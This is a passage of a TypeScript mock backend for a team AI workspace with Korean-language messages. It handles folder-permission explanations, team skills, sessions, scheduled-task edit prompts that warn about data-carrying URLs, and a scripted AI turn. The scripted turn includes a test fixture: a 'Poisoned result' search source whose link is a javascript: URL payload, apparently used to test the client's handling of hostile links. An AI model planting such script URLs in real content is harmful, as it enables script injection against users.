      const e = rules.explain({ id, name: u?.name ?? id, role: u?.role ?? 'member', groups: u?.groupIds ?? [] }, at)
      return { user: { id, name: u?.name ?? id }, role: u?.role ?? 'member', access: e.access, reason: e.reason, rules: rs }
    }).sort((a, b) => byPerson(a.user, b.user))
    return { path: p, exists: p === '' || this.files.get(p)?.type === 'folder', ruleFolder, people, total: pg.total, nextCursor: pg.nextCursor, summary: summarize(all), inactive }
  }
  explainPerson(who: { user: User | null; role: User['role']; groupIds: string[] }, q: { prefix?: string; cursor?: string; limit?: number }): PersonAccessResponse {
    type Row = PersonAccessResponse['folders'][number]
    const rules = this.explainRules()
    const p = { id: who.user?.id ?? '\u0000new-person', name: who.user?.name ?? '', role: who.role, groups: who.groupIds }
    const cands = new Map<string, Pick<Row, 'path' | 'kinds' | 'group' | 'projects' | 'connected'>>()
    const add = (path: string, k: Row['kinds'][number]) => {
      if (!shownSegs(path)) return null
      const c = cands.get(path) ?? { path, kinds: [] }
      if (!c.kinds.includes(k)) c.kinds.push(k)
      cands.set(path, c)
      return c
    }
    for (const f of rules.ruleFolders()) add(f, 'rules')
    for (const [path, n] of this.files) if (n.type === 'folder' && !path.includes('/')) add(path, 'top')
    for (const g of this.groups) { const c = this.isFolder(`groups/${g.name}`) ? add(`groups/${g.name}`, 'group') : null; if (c) c.group = { id: g.id, name: g.name } }
    for (const pr of this.projects) { const c = add(pr.folderPath, 'project'); if (c) c.projects = [...(c.projects ?? []), { id: pr.id, name: pr.name }] }
    for (const [path, n] of this.files) if (n.type === 'folder' && /^connected\/[^/]+$/.test(path)) { const c = add(path, 'connected'); if (c) c.connected = { id: `connected-${path.slice(10)}`, name: path.slice(10) } }
    if (who.user) cands.set(`users/${who.user.id}`, { path: `users/${who.user.id}`, kinds: ['personal'] })
    const pg = pageByPath([...cands.values()], q)
    let listing: ReturnType<RuleSet['listing']> | undefined
    const folders = pg.items.map((c) => {
      const personal = c.kinds.includes('personal')
      const e = rules.explain(p, segsOf(c.path))
      // someone new has no users/<id> yet: it is not named, as on the server
      const look = () => { const l = (listing ??= rules.listing(p)); return who.user ? l.at(segsOf(c.path), MAX_VIA, shownPath) : withoutOwnFolder(l.at(segsOf(c.path), MAX_VIA + 1, shownPath), `users/${p.id}`, MAX_VIA) }
      return { ...c, exists: personal ? null : this.isFolder(c.path), access: e.access, reason: e.reason, ...navigation(look, e.access) }
    })
    return { user: who.user ? { id: who.user.id, name: who.user.name } : null, role: who.role, status: who.user?.status ?? null,
      groups: who.groupIds.map((id) => ({ id, name: this.groups.find((g) => g.id === id)?.name ?? id })).sort((a, b) => a.name.localeCompare(b.name)), folders, total: pg.total, nextCursor: pg.nextCursor }
  }

  /** the tree of Admin › 폴더 권한 › 폴더별 (like explainTree in server/src/admin/access-explain.ts): the folders here,
   * the same rows and order (server/src/admin/access-tree.ts) */
  explainTree(q: { path?: string; cursor?: string; limit?: string; open?: string; rules?: string }): AccessTreeResponse {
    const input = folderInput(q.path)
    if ('refuse' in input) fail('validation', 400, input.refuse === 'personal' ? '개인 폴더(users/)는 본인만 봐요. 사람 기준으로 확인해 주세요.' : '팀 폴더 경로가 아니에요.', { 'query.path': input.detail })
    const segs = (input as { segs: string[] }).segs
    const p = segs.join('/')
    const sub = (s: readonly string[]) => {
      const base = s.join('/')
      const out: string[] = []
      for (const [path, n] of this.files) {
        if (n.type !== 'folder' || path === '' || path === base) continue
        const at = path.lastIndexOf('/')
        if ((at < 0 ? '' : path.slice(0, at)) === base && (s.length === 0 || shownSegs(path))) out.push(path.slice(at + 1))
      }
      return out
    }
    const marks = new Map<string, TreeMark>()
    const mark = (path: string, kind: AccessFolderKind) => { const m = marks.get(path) ?? { kinds: new Set() }; m.kinds.add(kind); marks.set(path, m); return m }
    for (const g of this.groups) if (this.isFolder(`groups/${g.name}`)) mark(`groups/${g.name}`, 'group').group = { id: g.id, name: g.name }
    for (const pr of this.projects) { const m = mark(pr.folderPath, 'project'); m.projects = [...(m.projects ?? []), { id: pr.id, name: pr.name }] }
    for (const [path, n] of this.files) if (n.type === 'folder' && /^connected\/[^/]+$/.test(path)) mark(path, 'connected').connected = { id: `connected-${path.slice(10)}`, name: path.slice(10) }
    const active = this.users.filter((u) => u.status === 'active')
    const src: TreeSource = {
      rules: this.explainRules(), people: active.map((u) => this.explainPrincipal(u)),
      groupName: (id) => this.groups.find((g) => g.id === id)?.name ?? null,
      personName: (id) => this.users.find((u) => u.id === id)?.name ?? null,
      children: sub, hasFolders: (s) => sub(s).length > 0, isFolder: (s) => s.length === 0 || this.files.get(s.join('/'))?.type === 'folder', marks, personal: active.length,
    }
    const exists = p === '' || this.files.get(p)?.type === 'folder'
    const page = { cursor: q.cursor, limit: q.limit ? Number(q.limit) : undefined }
    return q.rules === '1' || q.rules === 'true' ? ruledAnswer(src, segs, exists, page) : treeAnswer(src, segs, exists, { ...page, open: q.open === '1' || q.open === 'true' })
  }

  /** the edit panel's preview (like explainEdit in server/src/admin/access-explain.ts): the server's own computation
   * (server/src/admin/access-edit.ts) over the rules and people here. A folder with a rule row as stored, any other as
   * the tree takes it; nothing in users/. Connected folders are those under connected/ here. */
  explainEdit(body: { path: string; rules: { subjectType: string; subjectId: string | null; access: Access }[] }, locale: Locale): FolderEditPreview {
    let p = body.path
    if (!this.folders.some((f) => f.path === p && !isParkedRow(f.path))) {
      const input = folderInput(p)
      if ('refuse' in input) fail('validation', 400, input.refuse === 'personal' ? serverMsg('rulesInUsers', locale) : '팀 폴더 경로가 아니에요.', { 'body.path': input.detail })
      p = (input as { segs: string[] }).segs.join('/')
    }
    if (p === 'users' || p.startsWith('users/')) fail('validation', 400, serverMsg('rulesInUsers', locale), { 'body.path': 'users/ cannot carry rules' })
    for (const [i, r] of body.rules.entries()) {
      if (r.subjectType === 'group' && !this.groups.some((g) => g.id === r.subjectId)) fail('validation', 400, serverMsg('unknownGroups', locale), { [`body.rules.${i}.subjectId`]: 'unknown group' })
      if (r.subjectType === 'user' && !this.users.some((u) => u.id === r.subjectId)) fail('validation', 400, serverMsg('unknownUsers', locale), { [`body.rules.${i}.subjectId`]: 'unknown person' })
    }
    const active = this.users.filter((u) => u.status === 'active')
    const segs = segsOf(p)
    const out = editPreview(
      { rules: this.explainRules(), people: active.map((u) => this.explainPrincipal(u)), groupName: (id) => this.groups.find((g) => g.id === id)?.name ?? null, personName: (id) => this.users.find((u) => u.id === id)?.name ?? null },
      p, body.rules, { team: isTeamDefaultFolder(p, false) ? (p === 'shared' ? 'shared' : 'skills') : null },
    )
    return { path: p, exists: p === '' || this.files.get(p)?.type === 'folder', connected: segs.length >= 2 && segs[0] === 'connected' && this.files.get(`connected/${segs[1]}`)?.type === 'folder', ...out }
  }

  // ---------------- team skills (like server/src/skills/*) ----------------
  skillChange(c: SkillChange) {
    this.skillChanges.unshift(c)
    const dir = c.path.slice(0, c.path.lastIndexOf('/'))
    this.publish({ type: 'notice', data: { level: 'info', code: 'skill_changed', message: `팀 스킬이 바뀌었어요: ${c.path} (${c.actor?.name ?? ''}${c.byAi ? ', AI가 저장' : ''})`, link: `/files?path=${encodeURIComponent(dir)}&select=${encodeURIComponent(c.path)}&history=${encodeURIComponent(c.path)}` } })
  }
  /** skills folders this person may change: owner / admin everything, others their own or their group's write rules */
  managed(u: User): string[] {
    if (u.role === 'owner' || u.role === 'admin') return ['skills']
    return this.skillManagers.filter((g) => (g.subjectType === 'user' && g.subjectId === u.id) || (g.subjectType === 'group' && u.groupIds.includes(g.subjectId))).map((g) => g.path)
  }
  teamLinkSkillName(path: string): string | null {
    return this.teamLinkSkill(path)?.name ?? null
  }
  /** the team skill a link names, as the owner reads it (name and title) */
  teamLinkSkill(path: string, viewer = this.users.find((u) => u.role === 'owner')!): { name: string; title: string } | null {
    const s = this.skillsFor(viewer).find((x) => x.path === path && !x.personal)
    return s ? { name: s.name, title: s.title ?? s.name } : null
  }
  teamLinkResponse(req: Request, viewer: User) {
    const l = this.teamLink
    const used = this.users.filter((u) => u.status === 'active').length
    if (!l) return { link: null, seats: { used, limit: null } }
    const named = l.skillPath ? this.teamLinkSkill(l.skillPath, viewer) : null
    const skill = l.skillPath ? { path: l.skillPath, name: named?.name ?? null, title: named?.title ?? null } : null
    // the starter's files a newcomer with the link's groups could read now (here: those that exist)
    const paths = l.starter ? l.starter.files.filter((f) => this.files.get(f)?.type === 'file') : []
    const starter = l.starter ? { kind: l.starter.kind, files: paths.length, paths } : null
    return {
      link: { id: l.id, url: `${new URL(req.url).origin}/join#t=${l.token}`, groupIds: l.groupIds, skill, starter, maxUses: l.maxUses, uses: l.uses, createdBy: l.createdBy, createdAt: l.createdAt, expiresAt: l.expiresAt, state: l.uses >= l.maxUses ? 'used_up' as const : 'active' as const },
      seats: { used, limit: null },
    }
  }
  /** a name of the team's language from a table of names per language (English for a language it lacks) */
  localized(names: Record<Locale, string>): string {
    return names[this.settings.defaultLocale as Locale] ?? names.en
  }
  /** the card the mock's draft shows for a source chat: meeting notes in a team notes folder, the company card news
   * from the team's brand folder, else a template */
  skillCard(chatId: string): { title: string; description: string; inputs: SkillInput[]; files: { path: string; latest: boolean }[]; recurring: boolean } {
    const asked = this.messages.filter((m) => m.chatId === chatId && m.role === 'user').flatMap((m) => m.attachments.map((a) => a.path ?? ''))
    const brand = asked.find((p) => /^groups\/[^/]+\/(브랜드|Brand)\//.test(p))
    if (brand) return {
      title: '홍보 카드뉴스', description: '회사 소개 자료로 카드뉴스 5장을 만들어요', recurring: false,
      inputs: [{ name: 'channel', label: '어디에 올릴까요', type: 'choice', default: 'instagram', options: [{ value: 'instagram', label: '인스타그램' }, { value: 'linkedin', label: '링크드인' }] }],
      files: [{ path: brand, latest: false }],
    }
    const notes = asked.find((p) => /\/(회의록|Meeting notes)\//.test(p))
    if (notes) return {
      title: '주간회의 할 일', description: '팀 회의록에서 사람마다 할 일을 정리해요', recurring: true,
      inputs: [{ name: 'scope', label: '누구 할 일', type: 'choice', default: 'mine', options: [{ value: 'mine', label: '내 할 일' }, { value: 'all', label: '사람별' }] }],
      files: [{ path: notes.slice(0, notes.lastIndexOf('/')), latest: true }],
    }
    return { title: '견적서 쓰기', description: '팀 양식으로 새 견적서를 만들어요', recurring: false, inputs: [], files: asked.slice(0, 1).map((p) => ({ path: p, latest: false })) }
  }
  /** like server/src/chat/skills.ts listSkills: skills/**.md and the caller's own users/<id>/skills/ with a name header,
   * only where the caller can read */
  skillsFor(u: User): { path: string; name: string; description: string; title?: string; inputs?: SkillInput[]; personal?: true }[] {
    const mine = `users/${u.id}/skills/`
    const out: { path: string; name: string; description: string; title?: string; inputs?: SkillInput[]; personal?: true }[] = []
    for (const [p, n] of this.files) {
      if (n.type !== 'file' || !p.endsWith('.md') || !(p.startsWith('skills/') || p.startsWith(mine)) || this.access(p, u) === 'none') continue
      const head = /^---\n([\s\S]*?)\n---/.exec(dec.decode(n.data!))?.[1]
      const name = head ? /^name:\s*(.+)$/m.exec(head)?.[1]?.trim() : undefined
      if (!name) continue
      // a SKILL.md's metadata title (the name people read), as the server reads it
      const title = p.endsWith('/SKILL.md') ? /^metadata:\n(?:[ \t]+.*\n)*?[ \t]+title:[ \t]*(.+)$/m.exec(head!)?.[1]?.trim().replace(/^(["'])(.*)\1$/, '$2') : undefined
      // its form (metadata inputs: one JSON text under "inputs: |"), as the server reads it
      const form = p.endsWith('/SKILL.md') ? /^[ \t]+inputs:[ \t]*\|\n((?:[ \t]{4,}.*\n?)+)/m.exec(head!)?.[1] : undefined
      let inputs: SkillInput[] | undefined
      try { inputs = form ? (JSON.parse(form) as SkillInput[]) : undefined } catch { inputs = undefined }
      out.push({ path: p, name, description: /^description:\s*(.+)$/m.exec(head!)?.[1]?.trim().replace(/^"(.*)"$/, '$1') ?? '', ...(title ? { title } : {}), ...(inputs?.length ? { inputs } : {}), ...(p.startsWith(mine) ? { personal: true as const } : {}) })
    }
    return out.sort((a, b) => a.name.localeCompare(b.name) || a.path.localeCompare(b.path))
  }
  manages(u: User, folder: string) {
    return this.managed(u).some((m) => folder === m || folder.startsWith(m + '/'))
  }
  suggestionFor(s: SkillSuggestion, u: User): SkillSuggestion {
    return { ...s, canReview: this.manages(u, s.targetFolder) }
  }
  skillManagersResponse() {
    return { folders: ['skills', 'skills/재무'], items: this.skillManagers }
  }

  // ---------------- realtime ----------------
  publish(ev: ServerEventInput) {
    const full = { ...ev, seq: ++this.seq, at: Date.now() }
    ServerEvent.parse(full)
    const text = JSON.stringify(full)
    this.buffer.push({ seq: full.seq, text })
    if (this.buffer.length > 5000) this.buffer.shift()
    for (const ws of this.sockets) ws.send(text)
  }

  // ---------------- helpers ----------------
  /** like server/src/admin/engine-choice.ts: owner / admins always, others as the admin allows */
  canChoose(u: User): boolean {
    if (u.role === 'owner' || u.role === 'admin') return true
    const c = this.memberChoice
    return c.mode === 'everyone' || (c.mode === 'selected' && (c.userIds.includes(u.id) || u.groupIds.some((g) => c.groupIds.includes(g))))
  }
  /** like the server: someone who may not pick naming another engine or model than they get anyway -> 403 */
  guardEngine(name: string, u: User, body: { engine?: unknown; model?: unknown }, current: { engine: string; model: string | null }) {
    if (body.engine === undefined && body.model === undefined) return
    this.engineRequests.push({ name, user: u.id, engine: body.engine, model: body.model })
    if (this.canChoose(u)) return
    if ((body.engine !== undefined && body.engine !== current.engine) || (body.model !== undefined && (body.model ?? null) !== current.model))
      fail('forbidden', 403, 'AI 엔진과 모델은 관리자가 정해요. 엔진을 고르지 말고 보내면 팀 기본 엔진으로 답해요.')
  }
  me(u: User, sid: string): Me {
    const prefs = { ...((u as User & { prefs?: Me['user']['prefs'] }).prefs ?? {}) }
    const choose = this.canChoose(u)
    if (!choose) { delete prefs.engine; delete prefs.model }
    return {
      user: { id: u.id, username: u.username, name: u.name, email: u.email, role: u.role, locale: u.localeChoice ?? this.settings.defaultLocale, localeChoice: u.localeChoice, mustChangePassword: u.mustChangePassword, prefs, canChooseEngine: choose },
      groups: this.groups.filter((g) => u.groupIds.includes(g.id)).map((g) => ({ id: g.id, name: g.name })),
      team: { name: this.settings.teamName, defaultLocale: this.settings.defaultLocale, browserAllowAll: this.settings.browserAllowAll, iconVersion: this.teamIcon?.version ?? null, voiceInput: this.settings.speechProvider === 'local' || (this.settings.speechProvider === 'openrouter' && this.speechKey.set), ...(this.settings.speechProvider === 'openrouter' && this.speechKey.set ? { voiceInputOutside: true as const } : {}), chatTrashRetentionDays: this.settings.chatTrashRetentionDays },
      session: { id: '0192f0a0-0000-7000-8000-000000000000', client: 'web', expiresAt: new Date(Date.now() + 30 * 86400_000).toISOString(), tempLogin: u.mustChangePassword && this.tempLogins.has(u.id) },
      server: {
        version: this.serverVersion, dev: !this.cloud, deployment: this.cloud ? 'hosted' : 'self', timeZone: this.settings.timeZone,
        ...(this.allConfidential ? { allChatsConfidential: true as const } : {}),
        ...(this.devEnv ? { devEnv: true as const } : {}),
        features: this.cloud
          ? { connectionChange: false, selfUpdate: false, officeUpdate: false, connectedFolders: false, apiEngineAnyUrl: false, hostDiagnostics: false, pluginFileInstall: false }
          : { connectionChange: true, selfUpdate: true, officeUpdate: false, connectedFolders: true, apiEngineAnyUrl: true, hostDiagnostics: true, pluginFileInstall: true },
      },
      passwordReset: this.resets.get(u.id) ?? null,
    }
    void sid
  }

  startSession(u: User) {
    const token = uuidv7()
    this.sessions.set(token, u.id)
    return `${DEV_SESSION_COOKIE}=${token}; Path=/; HttpOnly; SameSite=Lax`
  }

  devEnvOf(user: User, projectId: string) {
    if (!this.devEnv || !this.projects.some((p) => p.id === projectId)) fail('not_found', 404)
    const running = this.devEnv!.box === 'running'
    const srt = this.devEnv!.srt
    if (srt) return {
      availability: { available: true },
      setting: { enabled: true, scope: { mode: 'writers' as const, groupIds: [], userIds: [] }, network: 'open' as const, limits: { cpus: 1, memoryMiB: 1536, pids: 512, diskGiB: 4, idleStopMin: 30 }, consent: { by: null, at: now(), warningVersion: 2 } },
      warningVersion: 2, mayUse: true, mayManage: user.role !== 'member', needsFolder: false, box: null, jobs: [], runs: srt, runner: 'srt' as const,
    }
    return {
      availability: { available: true },
      setting: { enabled: true, scope: { mode: 'writers' as const, groupIds: [], userIds: [] }, network: 'open' as const, limits: { cpus: 1, memoryMiB: 2560, pids: 512, diskGiB: 4, idleStopMin: 30 }, consent: { by: null, at: now(), warningVersion: 1 } },
      warningVersion: 1,
      mayUse: true,
      mayManage: user.role !== 'member',
      needsFolder: false,
      box: { state: this.devEnv!.box, startedAt: running ? now() : null, lastActiveAt: now(), memoryMiB: running ? 412 : null, processes: running ? [{ pid: 41, seconds: 120, command: 'npx remotion studio --port 5173' }] : [], stopCode: null },
      jobs: [],
      runs: { running: [], waiting: [] },
      runner: 'box' as const,
    }
  }

  userOf(req: Request): User | null {
    const cookie = req.headers.get('cookie') ?? ''
    const m = cookie.match(new RegExp(`${DEV_SESSION_COOKIE}=([^;]+)`))
    const id = m ? this.sessions.get(m[1]!) : undefined
    return this.users.find((u) => u.id === id && u.status === 'active') ?? null
  }

  branchInfo(m: Message): Message['branch'] {
    const sibs = this.messages.filter((x) => x.chatId === m.chatId && x.parentId === m.parentId && x.role === m.role)
    return { index: sibs.findIndex((x) => x.id === m.id), count: sibs.length, siblingIds: sibs.map((x) => x.id) }
  }
  view(m: Message): Message {
    return { ...m, branch: this.branchInfo(m) }
  }
  activeLeaf = new Map<string, string>()
  path(chatId: string): Message[] {
    const leaf = this.activeLeaf.get(chatId)
    const out: Message[] = []
    let cur = leaf ? this.messages.find((m) => m.id === leaf) : undefined
    while (cur) {
      out.unshift(this.view(cur))
      const pid: string | null = cur.parentId
      cur = pid ? this.messages.find((m) => m.id === pid) : undefined
    }
    return out
  }
  newestLeafUnder(id: string): string {
    let cur = id
    for (;;) {
      const kids = this.messages.filter((m) => m.parentId === cur)
      if (!kids.length) return cur
      cur = kids[kids.length - 1]!.id
    }
  }

  message(o: Partial<Message> & Pick<Message, 'chatId' | 'role' | 'parentId'>): Message {
    const m: Message = { id: uuidv7(), author: null, content: '', attachments: [], steps: [], status: 'done', error: null, turnId: null, engine: null, model: null, files: null, usage: null, createdAt: now(), branch: { index: 0, count: 1, siblingIds: [] }, ...o }
    this.messages.push(m)
    return m
  }

  /** The edit card of a scheduled task (server/src/tools/schedules.ts scheduleCard, mode 'edit'), in Korean. */
  scheduleEditRequest(x: Schedule, b: { title: string; prompt: string; repeat: Schedule['repeat']; time: string; weekday?: number | null; day?: number | null; date?: string | null; projectId: string | null }) {
    if (x.templateId) throw new Fail('conflict', 409, '이 예약 작업은 이 방법으로 바꿀 수 없어요. 화면을 새로 고친 뒤 다시 해 주세요.', undefined, { reason: 'schedule_template' })
    const bad: Record<string, string> = {}
    if (!b.title.trim() || b.title.trim().length > 80) bad['body.title'] = '이 칸을 확인해 주세요.'
    if (b.prompt.trim().length < 3) bad['body.prompt'] = '이 칸을 확인해 주세요.'
    if (Object.keys(bad).length) fail('validation', 400, '예약 작업을 확인해 주세요. 제목은 1–80자, 지시문은 3–4,000자로 쓰고 일정(시각, 요일, 날짜)을 골라 주세요.', bad)
    if (b.repeat === 'once' && (!b.date || b.date < now().slice(0, 10))) fail('validation', 400, '그 시각은 이미 지났어요. 앞으로의 날짜와 시각을 골라 주세요.', { 'body.date': '그 시각은 이미 지났어요. 앞으로의 날짜와 시각을 골라 주세요.' })
    const project = b.projectId ? this.projects.find((p) => p.id === b.projectId) ?? fail('validation', 400, '그 프로젝트를 찾을 수 없거나 열 수 없어요.', { 'body.projectId': 'not found' }) : null
    const days = ['일요일', '월요일', '화요일', '수요일', '목요일', '금요일', '토요일']
    const when = b.repeat === 'once' ? `${b.date} ${b.time}에 한 번` : b.repeat === 'daily' ? `매일 ${b.time}` : b.repeat === 'weekdays' ? `평일(월–금) ${b.time}` : b.repeat === 'weekly' ? `매주 ${days[b.weekday ?? 0]} ${b.time}` : `매월 ${b.day}일 ${b.time}`
    const urls = [...new Set(b.prompt.match(/https?:\/\/[^\s<>"')]+/g) ?? [])]
    const long = urls.filter((u) => new URL(u).search.length - 1 > 200), opens = urls.filter((u) => !long.includes(u))
    const lines = [`예약 작업을 이렇게 바꿀까요? 예약 작업은 아무도 지켜보지 않을 때 아래 지시문을 그대로 실행해요. 지시문과 주소를 확인해 주세요.\n\n제목: ${b.title.trim()}\n일정: ${when}${project ? `\n프로젝트: ${project.name}` : ''}`]
    if (opens.length) lines.push(`실행할 때마다 아래 주소 ${opens.length}개는 묻지 않고 열어요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.`)
    if (long.length) lines.push(`주소 뒤에 긴 내용(200자 넘는 쿼리)이 붙은 아래 주소 ${long.length}개는 실행 때 열지 않아요(강조 표시). 이런 주소는 늘 사람이 확인해야 하는데, 실행 중에는 확인할 사람이 없어요.`)
    const details = [{ label: '지시문', text: b.prompt.trim() }]
    if (opens.length) details.push({ label: '실행 때 묻지 않고 여는 주소', text: opens.join('\n') })
    if (long.length) details.push({ label: '실행 때 열지 않는 주소(긴 쿼리)', text: long.join('\n'), marks: long.map((u) => new URL(u).search) } as never)
    const key = JSON.stringify([b.title.trim(), b.prompt.trim(), b.repeat, b.time, b.weekday ?? null, b.day ?? null, b.date ?? null, b.projectId])
    return { kind: 'ask_user' as const, origin: 'server' as const, requestId: `schedule-edit-${x.id}-${Bun.hash(key).toString(36)}`, allowText: false, multiple: false,
      question: lines.join('\n\n'), options: [{ label: '바꾸기', value: 'save' }, { label: '바꾸지 않기', value: 'cancel' }], details }
  }

  /** "devqueue": box_shell on srt waits in the team queue (Step.devEnvRun, server/src/devenv/srt/queue.ts): #2 in line,
   * then #1, then it starts; GET /api/dev-env/runs gives the live place and POST .../stop cancels it. "slow": each place
   * holds 4 s; "devqueuefull": it waits too long and ends with the dev environment full; "devqueuejob": a job that
   * waits (#1) after the answer ends. */
  async devQueueTurn(chatId: string, user: User, prompt: string, assistant: Message, pub: (ev: ServerEventInput) => void, step: (s: Partial<Step> & Pick<Step, 'id' | 'kind' | 'label'>) => Step) {
    this.devEnv ??= { box: 'stopped' }
    const srt = (this.devEnv.srt ??= { running: [], waiting: [] })
    const id = `dq-${assistant.id.slice(-8)}`
    const by = { id: user.id, name: user.name }
    if (/devqueuejob/i.test(prompt)) {
      // a job: the call returns at once, queued #1; it stays in line after the answer
      srt.waiting = [...srt.waiting, { id, kind: 'job', name: 'render', by, startedAt: now(), runAt: null, position: 1, memoryMiB: null, lastLine: '', chatId, projectId: null }]
      const j = step({ id: 'q1', kind: 'tool', tool: 'box_shell', label: 'box_shell npx remotion render', status: 'ok', endedAt: now(), devEnvRun: { id, kind: 'job', state: 'waiting', position: 1 } })
      assistant.steps = [...assistant.steps.filter((y) => y.id !== j.id), j]
      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: j } })
      return
    }
    srt.waiting = [...srt.waiting.filter((r) => r.id !== id), { id, kind: 'command', name: 'npm run build', by, startedAt: now(), runAt: null, position: 2, memoryMiB: null, lastLine: '', chatId, projectId: null }]
    const put = (x: Step) => { assistant.steps = [...assistant.steps.filter((y) => y.id !== x.id), x]; pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: x } }) }
    const q = step({ id: 'q1', kind: 'tool', tool: 'box_shell', label: 'box_shell npm run build', devEnvRun: { id, kind: 'command', state: 'waiting', position: 2 } })
    put(q)
    const hold = /slow/i.test(prompt) ? 4000 : 1500
    const waiting = () => srt.waiting.find((r) => r.id === id)
    for (const place of [2, 1]) {
      const e = waiting()
      if (e) e.position = place
      for (let t = 0; t < hold && waiting() && !this.stopped.has(assistant.turnId!); t += 50) await sleep(50)
    }
    const cancelled = !waiting()
    srt.waiting = srt.waiting.filter((r) => r.id !== id)
    const end = cancelled ? 'cancelled' as const : /devqueuefull/i.test(prompt) ? 'expired' as const : 'started' as const
    put({ ...q, status: end === 'started' ? 'ok' : 'error', endedAt: now(), devEnvRun: { id, kind: 'command', state: end, position: null } })
  }

  /** The scripted AI. */
  async runTurn(chatId: string, user: User, prompt: string, assistant: Message) {
    const turnId = assistant.turnId!
    const gen = this.generation
    const pub = (ev: ServerEventInput) => {
      if (gen !== this.generation) throw new Error('mock was reset')
      this.publish(ev)
    }
    const slow = /slow/i.test(prompt)
    const step = (s: Partial<Step> & Pick<Step, 'id' | 'kind' | 'label'>): Step => ({ status: 'running', startedAt: now(), endedAt: null, ...s })
    await sleep(60)
    while ((this.queuePositions.get(chatId) ?? 0) > 0 && !this.stopped.has(turnId)) {
      if (gen !== this.generation) return
      await sleep(20)
    }
    this.queuePositions.delete(chatId)
    pub({ type: 'queue.position', data: { chatId, messageId: assistant.id, turnId, position: 0, epoch: this.epoch, revision: ++this.queueRevision } })
    const s1 = step({ id: 's1', kind: 'tool', tool: 'grep', label: 'grep "plan" in marketing/' })
    assistant.steps = [s1]
    pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s1 } })
    await sleep(80)
    const s1done = { ...s1, status: 'ok' as const, endedAt: now() }
    assistant.steps = [s1done]
    pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s1done } })
    if (/search/i.test(prompt)) {
      const s2 = step({ id: 's2', kind: 'web_search', tool: 'WebSearch', label: 'Web search "team ax"', status: 'ok', endedAt: now(), sources: [{ title: 'Example result', url: 'https://example.com/a' }, { title: 'Poisoned result', url: 'javascript:top.document.title="pwned-search"' }] })
      assistant.steps = [...assistant.steps, s2]
      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s2 } })
    }
    if (/devqueue/i.test(prompt)) await this.devQueueTurn(chatId, user, prompt, assistant, pub, step)
    if (/sub-agent/i.test(prompt)) {
      // a sub-agent (Claude Code's Agent tool): its sub-task step, then its own steps under it (Step.parentId)
      const put = (x: Step) => { assistant.steps = [...assistant.steps.filter((y) => y.id !== x.id), x]; pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: x } }) }
      const a1 = step({ id: 'A1', kind: 'tool', tool: 'agent', label: '하위 작업: 계약서 비교', subtask: {} })
      put(a1)
      put(step({ id: 'c1', kind: 'tool', tool: 'read', label: '파일 읽기 · shared/contract-1.md', parentId: 'A1', status: 'ok', endedAt: now() }))
      put({ ...a1, subtask: { toolUses: 1, ms: 1200 } })
      put(step({ id: 'c2', kind: 'tool', tool: 'grep', label: '내용 검색 "수수료" · shared/', parentId: 'A1' }))
      put({ ...a1, subtask: { toolUses: 2, ms: 2400 } })
      await sleep(1500)
      put(step({ id: 'c2', kind: 'tool', tool: 'grep', label: '내용 검색 "수수료" · shared/', parentId: 'A1', status: 'ok', endedAt: now() }))
      put({ ...a1, status: 'ok', endedAt: now(), subtask: { toolUses: 2, ms: 80_400, hidden: 3 } })
    }
    // ("/meeting-tasks …", the general skill, has "ask" in its name and is no ask)
    if (/ask/i.test(prompt) && !/^\/meeting-tasks\b/.test(prompt)) {
      const requestId = 'q1'
      // "siteask": like server/src/tools/url-gate.ts with a site to allow (open once / allow the site / don't open) for a
      // plain address; "markask": an address with a random-looking part, highlighted, and no site choice
      const siteUrl = 'https://docs.example.co.kr/guide/start'
      const markUrl = 'https://docs.example.co.kr/r/c2fsyxj5ltk4nzy1ndmy'
      // "browsersite": like the in-app browser asking to open an office-network address (once / always / deny)
      const request: TurnRequest = /devenvsite/i.test(prompt)
        ? { kind: 'dev_env_site', requestId, host: 'api.openweathermap.org', command: 'curl -s https://api.openweathermap.org/data/2.5/weather?q=Seoul' }
        : /browsersite/i.test(prompt)
        ? { kind: 'browser_site', requestId, url: 'http://10.0.0.5/intranet/', host: '10.0.0.5', reason: '사내 문서 페이지를 열려고 해요.' }
        : /siteask/i.test(prompt)
        ? { kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
          question: `AI가 이 대화에 나온 적 없는 주소를 열려고 해요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.\n\n${siteUrl}\n\n사이트를 허용하면 이 대화에서만 example.co.kr의 다른 주소도 묻지 않고 열어요. 알아보기 어려운 긴 문자열이나 긴 내용이 붙은 주소는 계속 물어요.`,
          options: [{ label: '열기', value: 'allow' }, { label: '이 대화에서 이 사이트 허용 (example.co.kr)', value: 'site' }, { label: '열지 않기', value: 'deny' }] }
        : /markask/i.test(prompt)
        ? { kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
          question: `AI가 이 대화에 나온 적 없는 주소를 열려고 해요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.\n\n${markUrl}\n\n주소에 알아보기 어려운 긴 문자열이 있어요(강조 표시). 내용을 실어 보낼 수 있으니 무엇인지 확인해 주세요.`,
          options: [{ label: '열기', value: 'allow' }, { label: '열지 않기', value: 'deny' }],
          details: [{ label: '주소', text: markUrl, marks: ['c2fsyxj5ltk4nzy1ndmy'] }] }
        : /safety/i.test(prompt)
        ? { kind: 'ask_user', origin: 'server', requestId, question: 'AI가 이 대화에 나온 적 없는 주소를 열려고 해요.\n\nhttps://example.com/?d=1', options: [{ label: '열기', value: 'allow' }, { label: '열지 않기', value: 'deny' }], allowText: false }
        : /multi/i.test(prompt)
          ? { kind: 'ask_user', requestId, question: '보고서에 어느 분기를 넣을까요?', options: [{ label: '3분기', value: 'q3' }, { label: '4분기', value: 'q4' }], multiple: true, allowText: true }
          : { kind: 'ask_user', requestId, question: '어느 분기를 볼까요?', options: [{ label: '3분기', value: 'q3' }, { label: '4분기', value: 'q4' }], allowText: true }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      this.openAsks.delete(turnId)
